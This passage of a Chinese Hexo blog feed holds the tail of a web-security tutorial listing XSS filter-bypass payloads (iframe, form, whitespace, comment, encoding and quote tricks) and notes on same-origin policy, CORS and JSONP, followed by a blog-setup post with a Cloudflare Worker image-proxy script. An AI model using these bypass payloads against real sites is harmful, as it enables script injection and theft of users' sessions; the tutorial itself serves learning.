srcdoc=&lt;svg/o&amp;#x6E;load&amp;equals;alert&amp;lpar;1)&amp;gt;&gt;&lt;/iframe&gt;</span><br><span class="line">&lt;iframe src=https://baidu.com width=1366 height=768&gt;&lt;/iframe&gt;</span><br><span class="line">&lt;iframe src=javascript:alert(1) width=1366 height=768&gt;&lt;/iframe</span><br></pre></td></tr></table></figure><p>form</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;form action=javascript:alert(1)&gt;&lt;input type=submit&gt;</span><br><span class="line">&lt;form&gt;&lt;button formaction=javascript:alert(1)&gt;M</span><br><span class="line">&lt;form&gt;&lt;input formaction=javascript:alert(1) type=submit value=M&gt;</span><br><span class="line">&lt;form&gt;&lt;input formaction=javascript:alert(1) type=image value=M&gt;</span><br><span class="line">&lt;form&gt;&lt;input formaction=javascript:alert(1) type=image src=1&gt;</span><br></pre></td></tr></table></figure><p><strong>空格绕过</strong></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">示例：</span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;javascript:alert(&#x27;xss&#x27;);&quot;</span>&gt;</span></span><br><span class="line">替换：</span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;java script:alert(&#x27;xss&#x27;);&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><p><strong>回车绕过</strong> (换行)</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">示例：</span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;javascript:alert(&#x27;xss&#x27;);&quot;</span>&gt;</span></span><br><span class="line">替换：</span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;java</span></span></span><br><span class="line"><span class="string"><span class="tag">script:</span></span></span><br><span class="line"><span class="string"><span class="tag">alert(&#x27;xss&#x27;);&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><p><strong>Tab绕过</strong></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">示例：</span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;javascript:alert(&#x27;xss&#x27;);&quot;</span>&gt;</span></span><br><span class="line">替换：</span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;javascript:alert(&#x27;xss&#x27;);&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><p><strong>注释绕过</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">示例：</span><br><span class="line">&lt;script&gt;<span class="title function_">alert</span>()&lt;/script&gt;</span><br><span class="line">替换：</span><br><span class="line">&lt;scri&lt;!--<span class="number">1</span>--&gt;pt&gt;<span class="title function_">alert</span>()&lt;/sc&lt;!--<span class="number">1</span>--&gt;ript&gt;</span><br></pre></td></tr></table></figure><p><strong>字符拼接</strong></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">利用eval：eval是Javascript内置函数，用于计算字符串表达式的值。</span><br><span class="line">示例：</span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;x&quot;</span> <span class="attr">onerror</span>=<span class="string">&quot;a=`aler`;b=`t`;c=&#x27;(`xss`);&#x27;;eval(a+b+c)&quot;</span>&gt;</span></span><br><span class="line">利用top</span><br><span class="line">示例：</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript">top[<span class="string">&quot;al&quot;</span>+<span class="string">&quot;ert&quot;</span>](<span class="string">`xss`</span>);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p><strong>编码绕过</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&amp; ——&gt; &amp;amp;</span><br><span class="line"><span class="string">&quot; ——&gt; &amp;quot;</span></span><br><span class="line"><span class="string">&#x27; ——&gt; &amp;#039;</span></span><br><span class="line"><span class="string">&lt; ——&gt; &amp;#lt;</span></span><br><span class="line"><span class="string">&gt; ——&gt; &amp;#gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Unicode编码</span></span><br><span class="line"><span class="string">r --&gt; &amp;#x0072 &amp;#0114</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">url编码</span></span><br><span class="line"><span class="string">&lt;img src=&quot;</span>javascript:%61%6C%65%72%74%28%22%78%73%73%22%29%3B;<span class="string">&quot;&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">ASCII码</span></span><br><span class="line"><span class="string">&lt;img src=&quot;</span>javascript:97,108,101,114,116,40,34,120,115,115,34,41,59<span class="string">&quot;&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">base64编码</span></span><br><span class="line"><span class="string">&lt;img src=&quot;</span>javascript:YWxlcnQoJ3hzcycpOw==<span class="string">&quot;&gt;</span></span><br></pre></td></tr></table></figure><p><strong>过滤双引号、单引号</strong></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">如果是html标签中，我们可以不用引号。如果是在js中，我们可以用反引号代替单双引号</span><br><span class="line">示例：</span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;x&quot;</span> <span class="attr">onerror</span>=<span class="string">alert(</span>&#x27;<span class="attr">xss</span>&#x27;);&gt;</span></span><br><span class="line">替换：</span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;x&quot;</span> <span class="attr">onerror</span>=<span class="string">alert(</span>`<span class="attr">xss</span>`);&gt;</span></span><br></pre></td></tr></table></figure><p><strong>htmlspecialchars绕过</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">没有对<span class="string">&#x27;进行实体编码，可以使用单引号构造payload</span></span><br><span class="line"><span class="string">#&#x27;</span> onclick=<span class="string">&#x27;alert(/xss/)&#x27;</span></span><br><span class="line">#<span class="string">&#x27; onmousemove=&#x27;</span><span class="title function_">alert</span>(<span class="regexp">/xss/</span>)<span class="string">&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">javascript:alert(123)</span></span><br></pre></td></tr></table></figure><h2 id="XSS跨站-网络钓鱼"><a href="#XSS跨站-网络钓鱼" class="headerlink" title="XSS跨站-网络钓鱼"></a>XSS跨站-网络钓鱼</h2><h2 id="5-同源和跨域"><a href="#5-同源和跨域" class="headerlink" title="5. 同源和跨域"></a>5. 同源和跨域</h2><p>跨域</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http:// www . baidu.com : 80 /index.php</span><br><span class="line">协议    子域名    主域名    端口  资源地址</span><br><span class="line">当协议、主机（主域名、子域名）、端口中的任意一个不相同时，称为不同域。不同域之间请求数据的操作，称为跨域操作。</span><br></pre></td></tr></table></figure><p>同源</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">对于js代码来说，为了安全考虑，所有浏览器都约定了“同源策略”，同源策略禁止页面加载或执行与自身来源不同的域的任何脚本，即不同域之间不能使用js进行操作。比如：x.com的js不能操作y.com域名下的对象。</span><br><span class="line">为什么要有同源策略呢？比如一个恶意网站页面通过js嵌入了银行的登录页面（二者不同源），也就是说恶意的请求了其他网站的页面或数据，拿到自己页面上用，如果没有同源限制，恶意网页的js脚本就可以在用户登录银行的时候获取用户名和密码。</span><br><span class="line"></span><br><span class="line">不受同源策略影响：（资源类型有限）</span><br><span class="line">&lt;script src=&quot;...&quot;&gt;//js加载执行</span><br><span class="line">&lt;img src=&quot;...&quot;&gt;//图片</span><br><span class="line">&lt;link href=&quot;...&quot;&gt;//css</span><br><span class="line">&lt;iframe src=&quot;...&quot;&gt;//任意资源</span><br><span class="line">&lt;a href=&quot;...&quot;&gt;//超链接地址</span><br><span class="line"></span><br><span class="line">修改：</span><br><span class="line">phpstudy\www\pikachu\pkxss\rkeypress\rkserver.php</span><br><span class="line">Access-Control-Allow-Origin:*,允许所有人访问。一般不会设置*。</span><br></pre></td></tr></table></figure><h3 id="cors跨域"><a href="#cors跨域" class="headerlink" title="cors跨域"></a>cors跨域</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">//设置允许被跨域访问</span><br><span class="line">header(&quot;Access-Control-Allow-Origin:*&quot;);</span><br></pre></td></tr></table></figure><h3 id="jsonp跨域"><a href="#jsonp跨域" class="headerlink" title="jsonp跨域"></a>jsonp跨域</h3><p>是一种利用 <code>&lt;script&gt;</code> 标签进行跨域数据请求的技术。它允许你在网页中请求来自其他域的数据，而无需担心浏览器的同源策略（Same-Origin Policy）带来的限制。</p>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>博客教程</title>
      <link href="/2024/10/17/%E5%8D%9A%E5%AE%A2%E6%95%99%E7%A8%8B/"/>
      <url>/2024/10/17/%E5%8D%9A%E5%AE%A2%E6%95%99%E7%A8%8B/</url>
      
        <content type="html"><![CDATA[<h1 id="博客介绍"><a href="#博客介绍" class="headerlink" title="博客介绍"></a>博客介绍</h1><p>该博客使用Github pages搭建，使用cloudflare加速，采用Hexo框架，使用安知鱼主题。</p><h1 id="教程"><a href="#教程" class="headerlink" title="教程"></a>教程</h1><p>搭建Hexo博客，快速简洁高效，零成本搭建个人博客：（Hexo + GitHub Pages + Cloudflare Pages 完整指南）<br><a href="https://blog.cmliussss.com/p/HexoBlogNo1/">https://blog.cmliussss.com/p/HexoBlogNo1/</a><br>美化Hexo博客，主题安装配置： （安知鱼）<br><a href="https://blog.cmliussss.com/p/HexoBlogNo2/">https://blog.cmliussss.com/p/HexoBlogNo2/</a><br>魔改教程：<br><a href="https://www.fomal.cc/posts/4aa2d85f.html">https://www.fomal.cc/posts/4aa2d85f.html</a><br>安知鱼主题教程：<br><a href="https://hexo.geekswg.top/anzhiyu-docs">https://hexo.geekswg.top/anzhiyu-docs</a></p><p>github+cloudflare搭建图床并实现加速：</p><p><a href="https://james-blog.top/posts/21.html">https://james-blog.top/posts/21.html</a></p><p>附worker代码，防止原教程失效(亲测，只需修改两处即可使用)</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Website you intended to retrieve for users.</span></span><br><span class="line"><span class="keyword">const</span> upstream = <span class="string">&quot;raw.githubusercontent.com&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Custom pathname for the upstream website.</span></span><br><span class="line"><span class="comment">// (1) 填写代理的路径，格式为 /&lt;用户&gt;/&lt;仓库名&gt;/&lt;分支&gt;</span></span><br><span class="line"><span class="keyword">const</span> upstream_path = <span class="string">&quot;****&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// github personal access token.</span></span><br><span class="line"><span class="comment">// (2) 填写github令牌</span></span><br><span class="line"><span class="keyword">const</span> github_token = <span class="string">&quot;****&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Website you intended to retrieve for users using mobile devices.</span></span><br><span class="line"><span class="keyword">const</span> upstream_mobile = upstream;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Countries and regions where you wish to suspend your service.</span></span><br><span class="line"><span class="keyword">const</span> blocked_region = [];</span><br><span class="line"></span><br><span class="line"><span class="comment">// IP addresses which you wish to block from using your service.</span></span><br><span class="line"><span class="keyword">const</span> blocked_ip_address = [<span class="string">&quot;0.0.0.0&quot;</span>, <span class="string">&quot;127.0.0.1&quot;</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">// Whether to use HTTPS protocol for upstream address.</span></span><br><span class="line"><span class="keyword">const</span> https = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Whether to disable cache.</span></span><br><span class="line"><span class="keyword">const</span> disable_cache = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Replace texts.</span></span><br><span class="line"><span class="keyword">const</span> replace_dict = &#123;</span><br><span class="line">  <span class="attr">$upstream</span>: <span class="string">&quot;$custom_domain&quot;</span>,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="title function_">addEventListener</span>(<span class="string">&quot;fetch&quot;</span>, <span class="function">(<span class="params">event</span>) =&gt;</span> &#123;</span><br><span class="line">  event.<span class="title function_">respondWith</span>(<span class="title function_">fetchAndApply</span>(event.<span class="property">request</span>));</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">fetchAndApply</span>(<span class="params">request</span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> region = request.<span class="property">headers</span>.<span class="title function_">get</span>(<span class="string">&quot;cf-ipcountry&quot;</span>)?.<span class="title function_">toUpperCase</span>();</span><br><span class="line">  <span class="keyword">const</span> ip_address = request.<span class="property">headers</span>.<span class="title function_">get</span>(<span class="string">&quot;cf-connecting-ip&quot;</span>);</span><br><span class="line">  <span class="keyword">const</span> user_agent = request.<span class="property">headers</span>.<span class="title function_">get</span>(<span class="string">&quot;user-agent&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">let</span> response = <span class="literal">null</span>;</span><br><span class="line">  <span class="keyword">let</span> url = <span class="keyword">new</span> <span class="title function_">URL</span>(request.<span class="property">url</span>);</span><br><span class="line">  <span class="keyword">let</span> url_hostname = url.<span class="property">hostname</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (https == <span class="literal">true</span>) &#123;</span><br><span class="line">    url.<span class="property">protocol</span> = <span class="string">&quot;https:&quot;</span>;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    url.<span class="property">protocol</span> = <span class="string">&quot;http:&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (<span class="keyword">await</span> <span class="title function_">device_status</span>(user_agent)) &#123;</span><br><span class="line">    <span class="keyword">var</span> upstream_domain = upstream;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">var</span> upstream_domain = upstream_mobile;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  url.<span class="property">host</span> = upstream_domain;</span><br><span class="line">  <span class="keyword">if</span> (url.<span class="property">pathname</span> == <span class="string">&quot;/&quot;</span>) &#123;</span><br><span class="line">    url.<span class="property">pathname</span> = upstream_path;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    url.<span class="property">pathname</span> = upstream_path + url.<span class="property">pathname</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (blocked_region.<span class="title function_">includes</span>(region)) &#123;</span><br><span class="line">    response = <span class="keyword">new</span> <span class="title class_">Response</span>(</span><br><span class="line">      <span class="string">&quot;Access denied: WorkersProxy is not available in your region yet.&quot;</span>,</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="attr">status</span>: <span class="number">403</span>,</span><br><span class="line">      &#125;</span><br><span class="line">    );</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (blocked_ip_address.<span class="title function_">includes</span>(ip_address)) &#123;</span><br><span class="line">    response = <span class="keyword">new</span> <span class="title class_">Response</span>(</span><br><span class="line">      <span class="string">&quot;Access denied: Your IP address is blocked by WorkersProxy.&quot;</span>,</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="attr">status</span>: <span class="number">403</span>,</span><br><span class="line">      &#125;</span><br><span class="line">    );</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">let</span> method = request.<span class="property">method</span>;</span><br><span class="line">    <span class="keyword">let</span> request_headers = request.<span class="property">headers</span>;</span><br><span class="line">    <span class="keyword">let</span> new_request_headers = <span class="keyword">new</span> <span class="title class_">Headers</span>(request_headers);</span><br><span class="line"></span><br><span class="line">    new_request_headers.<span class="title function_">set</span>(<span class="string">&quot;Host&quot;</span>, upstream_domain);</span><br><span class="line">    new_request_headers.<span class="title function_">set</span>(<span class="string">&quot;Referer&quot;</span>, url.<span class="property">protocol</span> + <span class="string">&quot;//&quot;</span> + url_hostname);</span><br><span class="line">    new_request_headers.<span class="title function_">set</span>(<span class="string">&quot;Authorization&quot;</span>, <span class="string">&quot;token &quot;</span> + github_token);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> original_response = <span class="keyword">await</span> <span class="title function_">fetch</span>(url.<span class="property">href</span>, &#123;</span><br><span class="line">      <span class="attr">method</span>: method,</span><br><span class="line">      <span class="attr">headers</span>: new_request_headers,</span><br><span class="line">      <span class="attr">body</span>: request.<span class="property">body</span>,</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> connection_upgrade = new_request_headers.<span class="title function_">get</span>(<span class="string">&quot;Upgrade&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (connection_upgrade &amp;&amp; connection_upgrade.<span class="title function_">toLowerCase</span>() == <span class="string">&quot;websocket&quot;</span>) &#123;</span><br><span class="line">      <span class="keyword">return</span> original_response;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> original_response_clone = original_response.<span class="title function_">clone</span>();</span><br><span class="line">    <span class="keyword">let</span> original_text = <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">let</span> response_headers = original_response.<span class="property">headers</span>;</span><br><span class="line">    <span class="keyword">let</span> new_response_headers = <span class="keyword">new</span> <span class="title class_">Headers</span>(response_headers);</span><br><span class="line">    <span class="keyword">let</span> status = original_response.<span class="property">status</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (disable_cache) &#123;</span><br><span class="line">      new_response_headers.<span class="title function_">set</span>(<span class="string">&quot;Cache-Control&quot;</span>, <span class="string">&quot;no-store&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      new_response_headers.<span class="title function_">set</span>(<span class="string">&quot;Cache-Control&quot;</span>, <span class="string">&quot;max-age=43200000&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    new_response_headers.<span class="title function_">set</span>(<span class="string">&quot;access-control-allow-origin&quot;</span>, <span class="string">&quot;*&quot;</span>);</span><br><span class="line">    new_response_headers.<span class="title function_">set</span>(<span class="string">&quot;access-control-allow-credentials&quot;</span>, <span class="string">&quot;true&quot;</span>);</span><br><span class="line">    new_response_headers.<span class="title function_">delete</span>(<span class="string">&quot;content-security-policy&quot;</span>);</span><br><span class="line">    new_response_headers.<span class="title function_">delete</span>(<span class="string">&quot;content-security-policy-report-only&quot;</span>);</span><br><span class="line">    new_response_headers.<span class="title function_">delete</span>(<span class="string">&quot;clear-site-data&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (new_response_headers.<span class="title function_">get</span>(<span class="string">&quot;x-pjax-url&quot;</span>)) &#123;</span><br><span class="line">      new_response_headers.<span class="title function_">set</span>(</span><br><span class="line">        <span class="string">&quot;x-pjax-url&quot;</span>,</span><br><span class="line">        response_headers</span><br><span class="line">          .<span class="title function_">get</span>(<span class="string">&quot;x-pjax-url&quot;</span>)</span><br><span class="line">          .<span class="title function_">replace</span>(<span class="string">&quot;//&quot;</span> + upstream_domain, <span class="string">&quot;//&quot;</span> + url_hostname)</span><br><span class="line">      );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> content_type = new_response_headers.<span class="title function_">get</span>(<span class="string">&quot;content-type&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (</span><br><span class="line">      content_type != <span class="literal">null</span> &amp;&amp;</span><br><span class="line">      content_type.<span class="title function_">includes</span>(<span class="string">&quot;text/html&quot;</span>) &amp;&amp;</span><br><span class="line">      content_type.<span class="title function_">includes</span>(<span class="string">&quot;UTF-8&quot;</span>)</span><br><span class="line">    ) &#123;</span><br><span class="line">      original_text = <span class="keyword">await</span> <span class="title function_">replace_response_text</span>(</span><br><span class="line">        original_response_clone,</span><br><span class="line">        upstream_domain,</span><br><span class="line">        url_hostname</span><br><span class="line">      );</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      original_text = original_response_clone.<span class="property">body</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    response = <span class="keyword">new</span> <span class="title class_">Response</span>(original_text, &#123;</span><br><span class="line">      status,</span><br><span class="line">      <span class="attr">headers</span>: new_response_headers,</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> response;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">replace_response_text</span>(<span class="params">response, upstream_domain, host_name</span>) &#123;</span><br><span class="line">  <span class="keyword">let</span> text = <span class="keyword">await</span> response.<span class="title function_">text</span>();</span><br><span class="line"></span><br><span class="line">  <span class="keyword">var</span> i, j;</span><br><span class="line">  <span class="keyword">for</span> (i <span class="keyword">in</span> replace_dict) &#123;</span><br><span class="line">    j = replace_dict[i];</span><br><span class="line">    <span class="keyword">if</span> (i == <span class="string">&quot;$upstream&quot;</span>) &#123;</span><br><span class="line">      i = upstream_domain;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (i == <span class="string">&quot;$custom_domain&quot;</span>) &#123;</span><br><span class="line">      i = host_name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (j == <span class="string">&quot;$upstream&quot;</span>) &#123;</span><br><span class="line">      j = upstream_domain;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (j == <span class="string">&quot;$custom_domain&quot;</span>) &#123;</span><br><span class="line">      j = host_name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> re = <span class="keyword">new</span> <span class="title class_">RegExp</span>(i, <span class="string">&quot;g&quot;</span>);</span><br><span class="line">    text = text.<span class="title function_">replace</span>(re, j);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> text;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">device_status</span>(<span class="params">user_agent_info</span>) &#123;</span><br><span class="line">  <span class="keyword">var</span> agents = [</span><br><span class="line">    <span class="string">&quot;Android&quot;</span>,</span><br><span class="line">    <span class="string">&quot;iPhone&quot;</span>,</span><br><span class="line">    <span class="string">&quot;SymbianOS&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Windows Phone&quot;</span>,</span><br><span class="line">    <span class="string">&quot;iPad&quot;</span>,</span><br><span class="line">    <span class="string">&quot;iPod&quot;</span>,</span><br><span class="line">  ];</span><br><span class="line">  <span class="keyword">var</span> flag = <span class="literal">true</span>;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">var</span> v = <span class="number">0</span>; v &lt; agents.<span class="property">length</span>; v++) &#123;</span><br><span class="line">    <span class="keyword">if</span> (user_agent_info.<span class="title function_">indexOf</span>(agents[v]) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">      flag = <span class="literal">false</span>;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span 